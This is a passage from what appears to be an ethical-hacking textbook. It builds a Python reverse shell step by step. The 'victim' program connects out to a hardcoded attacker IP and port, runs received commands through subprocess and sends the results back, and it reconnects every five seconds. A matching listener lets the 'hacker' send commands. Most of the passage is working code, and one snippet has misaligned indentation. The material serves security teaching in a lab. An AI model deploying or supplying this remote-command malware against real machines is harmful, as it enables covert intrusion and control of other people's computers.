
We can close the socket using the close() method. The complete program is as follows:

```
import socket

if __name__ == "__main__":
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    hacker_IP = "192.168.74.128"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    victim_socket.connect(hacker_address)
    data = victim_socket.recv(1024)
    print(data.decode())
    victim_socket.close()
```

Now our hacker and victim programs are complete in their simplest form. A hacker is listening for incoming connections, and the victim tries to connect with the hacker program. Once the connection is established, the hacker sends a message to the victim. The victim receives the message and simply prints it. Both parties then close their respective connections. What we have learned so far is generic socket programming. Once we understand how we can create connections between two devices in a network, we can adopt these programs to create malicious programs that can allow hackers to perform malicious activities on the victim's computer.

Let's tie all this together. First, run the hacker program and then run the victim's program. This time, the connection will be properly established and, on the hacker's machine, you will see the following output:

![](img/d31345bbfd15f63be2920f0de5fa30dc_140_0.png)

Similarly, the victim will receive the message and display it on screen:

![](img/d31345bbfd15f63be2920f0de5fa30dc_140_1.png)

We have completed one part of the puzzle, which is to create a successful connection from the victim's machine to the hacker's machine, and received a small message at the victim's machine, sent by the hacker. This may not seem like a big task, but this is a very powerful tool. Using this, you can essentially take commands from the hacker. Design the victim program to run these commands on the machine and send the results back to the hacker. In the next section, we will learn how to send commands from the hacker's machine to the victim's machine and send the results back to the hacker.

## Running commands remotely on the victim's machine

We have already seen in Chapter 3, Reconnaissance and Information Gathering (in the Creating a Python script section), how to run commands on a computer using Python. We will build on that knowledge to create a malware that will take commands and execute them on a victim's machine. Our previous program just sends one message to the victim and exits. This time, we will modify the program to do much more than that.

Open a new project on the Kali machine to execute commands on the victim's machine and create a new file. Let's start by establishing a connection:

```
import socket

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
```

The next step involves taking the user input for the command we want to run on the victim's machine. Once this input is taken, we must convert it into bytes and send it over the connection to the victim program:

```
command = input("Enter the command ")
hacker_socket.send(command.encode())
```

Once the command is sent, the victim side program will take care of executing it and return the result. Here, on the hacker program, we will simply receive whatever is returned by the victim and print it as a result:

```
command_result = hacker_socket.recv(1048)
print(command_result.decode())
```

Next, we will put this inside a loop and put an exit condition as well:

```
while True:
    command = input("Enter the command ")
    hacker_socket.send(command.encode())
    if command == "stop":
        break
    command_result = hacker_socket.recv(1048)
    print(command_result.decode())
```

The if statement makes sure that we can safely exit this loop when we want so that we don't get stuck in an infinite loop. Also, to make sure that we close the socket properly if we encounter any error during execution, we will add a try-catch block for exception handling. The complete hacker program for executing commands looks like this:

```
import socket

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
    print("connection established with ", client_address)
    try:
        while True:
            command = input("Enter the command ")
            hacker_socket.send(command.encode())
```

```
if command == "stop":
    break
    command_result = hacker_socket.recv(1048)
    print(command_result.decode())
except Exception:
    print("Exception occured")
    hacker_socket.close()
```

On the victim side, we will receive the command that the hacker sends and use the subprocess module to execute commands, and finally send the results back to the hacker. This part will be coded on the Windows 10 machine. Let’s create a new project on the Windows machine and try to follow the same steps for creating a connection with the hacker program:

```
import socket
if __name__ == "__main__":
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_IP = "192.168.74.128"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    victim_socket.connect(hacker_address)
```

As we have seen on the hacker program that we have a while loop to send commands continuously, we will deploy a similar approach here:

```
data = victim_socket.recv(1024)
    hacker_command = data.decode()
```

We will add a similar exit condition here, as we did in the hacker program:

```
if hacker_command == "stop":
    break
```

![](img/d31345bbfd15f63be2920f0de5fa30dc_145_0.png)

Figure 6.7 – Hacker executing a command on the victim

Here, you can see that the hacker sends an ipconfig command to the victim. The victim program reads the command, executes it on the victim, and sends the result back to the hacker. There are some minor issues with the program that we will now discuss. Firstly, the victim program tries to connect just once with the hacker, and if the hacker is not listening, the program will throw an error and exit. This is not ideal since we want to connect to the victim whenever we want. To do this, we will put the connect() method inside the loop so that it can attempt to continuously make a connection with the hacker, and when the hacker is online, the connection is immediately established. Take a look at the code for the victim program here: https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py.

Let's now take a look at the changes made in this program. First, there is an outer while loop. The purpose of this loop is to constantly try to establish a connection with the hacker, and if an error occurs, it waits 5 seconds and then tries to reconnect. Once the connection is established inside the loop, there is another loop inside that makes sure that multiple commands can be sent by the hacker to the victim. This while loop can be exited by the hacker by using the stop command. Lastly, there is a keyboard interrupt exception if you want to close the program. Press Ctrl + C to exit the program. This way, this program won't run indefinitely.

So now we have solved our first problem. Now we need to run the victim program only once and it will keep on trying to connect with the hacker and, when the hacker becomes available, it will connect. Our program has another small issue as well. When the hacker program asks to enter a command, if we just press Enter, it will cause problems because Enter is not a valid command. We also need to handle that as well. To handle it, we can simply include a check to make sure that the hacker does not enter an empty command. To do this, enter the following commands:

```
if command == "":
    continue
```

We will put this check both in the hacker's as well as the victim's program.

Lastly, if you notice carefully, we can only send and receive data that is less than 1,024 bytes, as defined in our receive function. Any data more than this will be truncated. To see it in more detail, go to the Windows machine and run any command whose result is more than 1,024 bytes. For instance, let's take a look at the systeminfo command. This command gives out the system information and has a relatively large output:

![](img/d31345bbfd15f63be2920f0de5fa30dc_146_0.png)

Figure 6.8 – systeminfo result
